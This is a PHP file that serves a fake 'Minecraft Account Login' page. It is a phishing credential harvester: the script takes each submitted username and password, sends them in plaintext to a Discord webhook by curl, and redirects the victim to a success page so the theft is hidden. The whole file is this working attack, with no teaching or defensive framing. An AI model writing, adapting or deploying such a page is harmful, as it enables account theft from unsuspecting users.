<?php
// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the submitted username and password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the message to send to Discord
    $message = "Username: " . $username . "\nPassword: " . $password;

    // Prepare the data to send to Discord
    $data = array('content' => $message);

    // Set the Discord webhook URL
    $webhook_url = 'https://discordapp.com/api/webhooks/...';

    // Send the data to Discord
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Redirect the user to a success page
    header('Location: success.php');
    exit;
}
?>

<html>
<head>
    <title>Minecraft Account Login</title>
</head>
<body>
    <h1>Login to your Minecraft Account</h1>
    <form action="" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
